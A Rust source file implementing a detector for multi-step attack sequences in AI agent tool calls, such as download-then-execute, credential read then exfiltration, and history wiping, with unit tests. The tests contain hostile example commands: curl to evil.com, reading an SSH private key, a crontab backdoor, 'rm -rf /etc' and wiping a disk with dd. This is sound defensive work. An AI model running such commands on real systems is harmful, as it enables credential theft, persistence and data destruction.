use std::collections::VecDeque;

/// A single tool call event for sequence analysis.
#[derive(Debug, Clone)]
pub struct ToolCallEvent {
    pub tool: String,
    pub command: String,
    pub intent: String,
    pub risk_score: f64,
}

/// A detected multi-step attack sequence.
#[derive(Debug, Clone)]
pub struct SequenceResult {
    /// Attack pattern name.
    pub pattern: String,
    /// Confidence score (0-1).
    pub confidence: f64,
    /// Severity score (0-1).
    pub severity: f64,
    /// Human-readable description.
    pub description: String,
    /// Indices of events involved.
    pub event_indices: Vec<usize>,
}

/// Sequence-based attack pattern detector.
///
/// Detects known multi-step attack chains from sequences of tool calls:
/// - Recon → Exploit → Exfiltrate
/// - Download → Execute
/// - Write → Make Executable → Run
/// - Read Credentials → Network Exfil
/// - Privilege Escalation → Persistence
pub struct SequenceClassifier {
    max_history: usize,
    events: VecDeque<ToolCallEvent>,
}

impl SequenceClassifier {
    pub fn new(max_history: usize) -> Self {
        Self {
            max_history,
            events: VecDeque::with_capacity(max_history + 1),
        }
    }

    pub fn with_default_history() -> Self {
        Self::new(50)
    }

    /// Record a new tool call event and detect patterns.
    pub fn record(&mut self, event: ToolCallEvent) -> Vec<SequenceResult> {
        self.events.push_back(event);
        if self.events.len() > self.max_history {
            self.events.pop_front();
        }
        self.detect_patterns()
    }

    fn detect_patterns(&self) -> Vec<SequenceResult> {
        let mut results = Vec::new();
        let events: Vec<&ToolCallEvent> = self.events.iter().collect();
        let len = events.len();
        if len < 2 {
            return results;
        }

        // Pattern 1: Download → Execute (wget/curl then bash/sh)
        self.detect_download_execute(&events, &mut results);

        // Pattern 2: Recon → Exploit (read sensitive then write/modify)
        self.detect_recon_exploit(&events, &mut results);

        // Pattern 3: Write → Chmod → Execute
        self.detect_write_chmod_exec(&events, &mut results);

        // Pattern 4: Read Credentials → Network Exfil
        self.detect_credential_exfil(&events, &mut results);

        // Pattern 5: Privilege Escalation → Persistence
        self.detect_priv_esc_persist(&events, &mut results);

        // Pattern 6: Rapid destructive chain (rm -rf + mkfs/make)
        self.detect_destructive_chain(&events, &mut results);

        // Pattern 7: History wiping after suspicious activity
        self.detect_history_wiping(&events, &mut results);

        // Pattern 8: Mass file read (recon burst)
        self.detect_recon_burst(&events, &mut results);

        results
    }

    fn detect_download_execute(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        let download_tools = ["bash", "curl", "wget"];
        let execute_tools = ["bash", "sh", "zsh"];
        for i in 0..events.len().saturating_sub(1) {
            let curr = events[i];
            let next = events[i + 1];
            let is_download = download_tools.iter().any(|t| curr.tool.contains(t))
                && (curr.command.contains("wget") || curr.command.contains("curl") || curr.command.contains("http"));
            let is_execute = execute_tools.iter().any(|t| next.tool.contains(t))
                && (next.command.contains("bash") || next.command.contains("sh") || next.command.contains("./"));
            if is_download && is_execute {
                results.push(SequenceResult {
                    pattern: "download-execute".to_string(),
                    confidence: 0.85,
                    severity: 0.9,
                    description: "Downloaded file from network then executed it".to_string(),
                    event_indices: vec![i, i + 1],
                });
            }
        }
    }

    fn detect_recon_exploit(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        let sensitive_tools = ["read_file", "bash", "grep"];
        let write_tools = ["write_file", "bash", "edit"];
        for i in 0..events.len().saturating_sub(1) {
            let curr = events[i];
            let next = events[i + 1];
            let is_recon = sensitive_tools.iter().any(|t| curr.tool.contains(t))
                && (curr.command.contains("/etc/") || curr.command.contains(".git/") || curr.command.contains(".ssh/") || curr.command.contains("shadow") || curr.command.contains("passwd") || curr.command.contains("config"));
            let is_write = write_tools.iter().any(|t| next.tool.contains(t))
                && (next.command.contains("write") || next.command.contains("echo") || next.command.contains(">"));
            if is_recon && is_write {
                results.push(SequenceResult {
                    pattern: "recon-exploit".to_string(),
                    confidence: 0.7,
                    severity: 0.85,
                    description: "Read sensitive file then wrote data — potential exploit".to_string(),
                    event_indices: vec![i, i + 1],
                });
            }
        }
    }

    fn detect_write_chmod_exec(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        for i in 0..events.len().saturating_sub(2) {
            if i + 2 >= events.len() { break; }
            let e1 = events[i];
            let e2 = events[i + 1];
            let e3 = events[i + 2];
            let is_write = e1.command.contains("write") || e1.command.contains("echo ") || e1.command.contains(">") || e1.tool.contains("write");
            let is_chmod = e2.command.contains("chmod") && (e2.command.contains("+x") || e2.command.contains("755") || e2.command.contains("777"));
            let is_exec = e3.command.contains("./") || e3.command.contains("bash ") || e3.command.contains("sh ");
            if is_write && is_chmod && is_exec {
                results.push(SequenceResult {
                    pattern: "write-chmod-exec".to_string(),
                    confidence: 0.9,
                    severity: 0.95,
                    description: "Created file, made executable, then ran it — classic payload execution".to_string(),
                    event_indices: vec![i, i + 1, i + 2],
                });
            }
        }
    }

    fn detect_credential_exfil(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        for i in 0..events.len().saturating_sub(1) {
            let curr = events[i];
            let next = events[i + 1];
            let is_cred_read = curr.command.contains(".ssh/") || curr.command.contains("id_rsa") || curr.command.contains("authorized_keys")
                || curr.command.contains(".env") || curr.command.contains("credentials") || curr.command.contains("token");
            let is_network = next.command.contains("curl") || next.command.contains("nc ") || next.command.contains("wget") || next.command.contains("ssh ");
            if is_cred_read && is_network {
                results.push(SequenceResult {
                    pattern: "credential-exfil".to_string(),
                    confidence: 0.85,
                    severity: 1.0,
                    description: "Read credentials then initiated network connection — possible exfiltration".to_string(),
                    event_indices: vec![i, i + 1],
                });
            }
        }
    }

    fn detect_priv_esc_persist(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        for i in 0..events.len().saturating_sub(1) {
            let curr = events[i];
            let next = events[i + 1];
            let is_priv_esc = curr.command.contains("sudo") || curr.command.contains("su ") || curr.command.contains("pkexec")
                || curr.command.contains("chmod 4777") || curr.command.contains("setuid");
            let is_persist = next.command.contains("cron") || next.command.contains("crontab") || next.command.contains("systemd")
                || next.command.contains("rc.local") || next.command.contains(".bashrc") || next.command.contains(".profile");
            if is_priv_esc && is_persist {
                results.push(SequenceResult {
                    pattern: "privilege-escalation-persistence".to_string(),
                    confidence: 0.75,
                    severity: 0.9,
                    description: "Escalated privileges then installed persistence mechanism".to_string(),
                    event_indices: vec![i, i + 1],
                });
            }
        }
    }

    fn detect_destructive_chain(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        let mut destructive_indices = Vec::new();
        for (i, e) in events.iter().enumerate() {
            if e.command.contains("rm -rf") || e.command.contains("mkfs") || e.command.contains("dd if=/dev/zero") {
                destructive_indices.push(i);
            }
        }
        if destructive_indices.len() >= 2 {
            results.push(SequenceResult {
                pattern: "destructive-chain".to_string(),
                confidence: 0.8,
                severity: 0.95,
                description: format!("Multiple destructive commands detected ({} operations)", destructive_indices.len()),
                event_indices: destructive_indices,
            });
        }
    }

    fn detect_history_wiping(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        for i in 1..events.len() {
            let prev = events[i - 1];
            let curr = events[i];
            let is_suspicious_prev = prev.risk_score > 0.5;
            let is_wiping = curr.command.contains("history -c") || curr.command.contains("rm ~/.bash_history")
                || curr.command.contains("rm .zsh_history") || curr.command.contains("> ~/.bash_history")
                || curr.command.contains("unset HISTORY");
            if is_suspicious_prev && is_wiping {
                results.push(SequenceResult {
                    pattern: "history-wipe-after-suspicious".to_string(),
                    confidence: 0.9,
                    severity: 0.85,
                    description: "History was wiped after a suspicious command — evasion attempt".to_string(),
                    event_indices: vec![i - 1, i],
                });
            }
        }
    }

    fn detect_recon_burst(&self, events: &[&ToolCallEvent], results: &mut Vec<SequenceResult>) {
        let window_size = 10;
        let read_threshold = 5;
        if events.len() < window_size {
            return;
        }
        let start = events.len().saturating_sub(window_size);
        let recent = &events[start..];
        let read_count = recent.iter().filter(|e| {
            e.tool.contains("read") || e.tool.contains("grep") || e.tool.contains("find")
                || e.tool.contains("ls")
        }).count();
        if read_count >= read_threshold {
            let unique_sensitive: Vec<&str> = {
                let mut v: Vec<&str> = recent.iter()
                    .filter(|e| e.command.contains("/etc/") || e.command.contains(".git/") || e.command.contains(".ssh/") || e.command.contains("/proc/"))
                    .map(|e| e.command.as_str())
                    .collect();
                v.sort();
                v.dedup();
                v
            };
            if unique_sensitive.len() >= 3 {
                results.push(SequenceResult {
                    pattern: "recon-burst".to_string(),
                    confidence: 0.7,
                    severity: 0.75,
                    description: format!("Rapid reconnaissance: {} reads with {} sensitive paths in last {} calls", read_count, unique_sensitive.len(), window_size),
                    event_indices: (start..events.len()).collect(),
                });
            }
        }
    }

    /// Reset the event history.
    pub fn reset(&mut self) {
        self.events.clear();
    }

    /// Get current event count.
    pub fn event_count(&self) -> usize {
        self.events.len()
    }

    /// Get recent events.
    pub fn recent_events(&self, n: usize) -> Vec<&ToolCallEvent> {
        let start = self.events.len().saturating_sub(n);
        self.events.iter().skip(start).collect()
    }
}

/// A detected sequence event for a single occurrence.
#[derive(Debug, Clone)]
pub enum SequenceEvent {
    DownloadExecute,
    ReconExploit,
    WriteChmodExec,
    CredentialExfil,
    PrivEscalationPersistence,
    DestructiveChain,
    HistoryWipe,
    ReconBurst,
}

impl SequenceEvent {
    pub fn description(&self) -> &'static str {
        match self {
            Self::DownloadExecute => "Download → Execute",
            Self::ReconExploit => "Recon → Exploit",
            Self::WriteChmodExec => "Write → Chmod → Execute",
            Self::CredentialExfil => "Credential Read → Network Exfil",
            Self::PrivEscalationPersistence => "Privilege Escalation → Persistence",
            Self::DestructiveChain => "Destructive Chain",
            Self::HistoryWipe => "History Wipe After Suspicious",
            Self::ReconBurst => "Recon Burst",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(tool: &str, command: &str, risk: f64) -> ToolCallEvent {
        ToolCallEvent {
            tool: tool.to_string(),
            command: command.to_string(),
            intent: "unknown".to_string(),
            risk_score: risk,
        }
    }

    #[test]
    fn test_download_execute_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        let results = seq.record(make_event("bash", "curl http://evil.com/payload.sh", 0.5));
        assert!(results.is_empty(), "single event should not trigger");
        let results = seq.record(make_event("bash", "bash payload.sh", 0.3));
        let has_pattern = results.iter().any(|r| r.pattern == "download-execute");
        assert!(has_pattern, "should detect download-execute, got: {:?}", results);
    }

    #[test]
    fn test_write_chmod_exec_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("write_file", "write /tmp/payload", 0.4));
        seq.record(make_event("bash", "chmod +x /tmp/payload", 0.3));
        let results = seq.record(make_event("bash", "./tmp/payload", 0.5));
        let has_pattern = results.iter().any(|r| r.pattern == "write-chmod-exec");
        assert!(has_pattern);
    }

    #[test]
    fn test_recon_exploit_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("read_file", "cat /etc/passwd", 0.6));
        let results = seq.record(make_event("bash", "echo 'hacked' > /etc/shadow", 0.7));
        let has_pattern = results.iter().any(|r| r.pattern == "recon-exploit");
        assert!(has_pattern);
    }

    #[test]
    fn test_credential_exfil_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("read_file", "cat ~/.ssh/id_rsa", 0.8));
        let results = seq.record(make_event("bash", "curl http://evil.com/steal", 0.6));
        let has_pattern = results.iter().any(|r| r.pattern == "credential-exfil");
        assert!(has_pattern);
    }

    #[test]
    fn test_priv_esc_persist_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("bash", "sudo chmod 4777 /tmp/backdoor", 0.7));
        let results = seq.record(make_event("bash", "echo '* * * * * root /tmp/backdoor' >> /etc/crontab", 0.8));
        let has_pattern = results.iter().any(|r| r.pattern == "privilege-escalation-persistence");
        assert!(has_pattern);
    }

    #[test]
    fn test_destructive_chain_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("bash", "rm -rf /var/log", 0.9));
        seq.record(make_event("bash", "rm -rf /etc", 0.9));
        let results = seq.record(make_event("bash", "dd if=/dev/zero of=/dev/sda", 0.95));
        let has_pattern = results.iter().any(|r| r.pattern == "destructive-chain");
        assert!(has_pattern);
    }

    #[test]
    fn test_history_wiping_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("bash", "rm -rf /etc/passwd", 0.9));
        let results = seq.record(make_event("bash", "history -c", 0.3));
        let has_pattern = results.iter().any(|r| r.pattern == "history-wipe-after-suspicious");
        assert!(has_pattern);
    }

    #[test]
    fn test_recon_burst_detected() {
        let mut seq = SequenceClassifier::with_default_history();
        for i in 0..12 {
            let path = match i % 4 {
                0 => "/etc/passwd",
                1 => "/etc/shadow",
                2 => ".git/config",
                3 => ".ssh/id_rsa",
                _ => "/tmp/file",
            };
            seq.record(make_event("read_file", &format!("cat {path}"), 0.3 + (i as f64 * 0.02)));
        }
        let results = seq.record(make_event("bash", "ls -la", 0.1));
        let has_pattern = results.iter().any(|r| r.pattern == "recon-burst");
        assert!(has_pattern, "should detect recon burst, got: {:?}", results.iter().map(|r| &r.pattern).collect::<Vec<_>>());
    }

    #[test]
    fn test_no_false_positive_on_safe() {
        let mut seq = SequenceClassifier::with_default_history();
        for cmd in &["ls -la", "cat src/main.rs", "cargo build", "git status", "echo done"] {
            seq.record(make_event("bash", cmd, 0.0));
        }
        let results = seq.record(make_event("read_file", "cat src/lib.rs", 0.0));
        assert!(results.is_empty(), "safe commands should not trigger patterns: {:?}", results);
    }

    #[test]
    fn test_reset() {
        let mut seq = SequenceClassifier::with_default_history();
        seq.record(make_event("bash", "rm -rf /", 0.9));
        seq.record(make_event("bash", "history -c", 0.3));
        assert_eq!(seq.event_count(), 2);
        seq.reset();
        assert_eq!(seq.event_count(), 0);
    }

    #[test]
    fn test_max_history() {
        let mut seq = SequenceClassifier::new(5);
        for i in 0..10 {
            seq.record(make_event("bash", &format!("cmd-{i}"), 0.1));
        }
        assert_eq!(seq.event_count(), 5);
    }

    #[test]
    fn test_sequence_event_description() {
        assert_eq!(SequenceEvent::DownloadExecute.description(), "Download → Execute");
        assert_eq!(SequenceEvent::ReconExploit.description(), "Recon → Exploit");
        assert_eq!(SequenceEvent::WriteChmodExec.description(), "Write → Chmod → Execute");
    }
}
